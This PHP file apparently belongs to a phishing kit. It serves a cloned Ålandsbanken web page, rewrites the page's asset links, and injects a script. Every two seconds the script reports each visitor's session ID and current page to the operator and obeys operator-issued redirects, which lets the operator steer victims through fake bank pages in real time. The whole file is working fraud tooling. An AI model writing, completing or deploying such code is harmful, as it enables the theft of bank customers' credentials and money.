<?php
ob_start();
header('Content-Type: text/html; charset=UTF-8');

$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Ålandsbanken');
$htmlContent = file_get_contents(__DIR__ . '/alandsbanken5.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'UTF-8');
}

$basePath = '/alandsbanken-files/';
$htmlContent = preg_replace('/\.\/[^"\'<>]*?landsbanken_files\//i', $basePath, $htmlContent);
$htmlContent = preg_replace('/[^"\'<>\/]*?landsbanken_files\//i', $basePath, $htmlContent);
$htmlContent = preg_replace('/href="\.\/([^"]*)"/i', 'href="#$1"', $htmlContent);
$htmlContent = preg_replace('/src="\.\/([^"]*landsbanken_files\/[^"]*)"/i', 'src="' . $basePath . '$1"', $htmlContent);
$htmlContent = preg_replace('/src="\.\/([^"]*)"/i', 'src="' . $basePath . '$1"', $htmlContent);
$htmlContent = preg_replace('/href="([^"]*landsbanken_files\/[^"]*)"/i', 'href="' . $basePath . '$1"', $htmlContent);

$htmlContent = str_replace('charset=windows-1252', 'charset=UTF-8', $htmlContent);
$htmlContent = str_replace('charset="windows-1252"', 'charset="UTF-8"', $htmlContent);

$adminScript = '';
if (isset($_SESSION['user_id'])) {
    $userId = $_SESSION['user_id'];
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

$htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
echo $htmlContent;
ob_end_flush();
?>

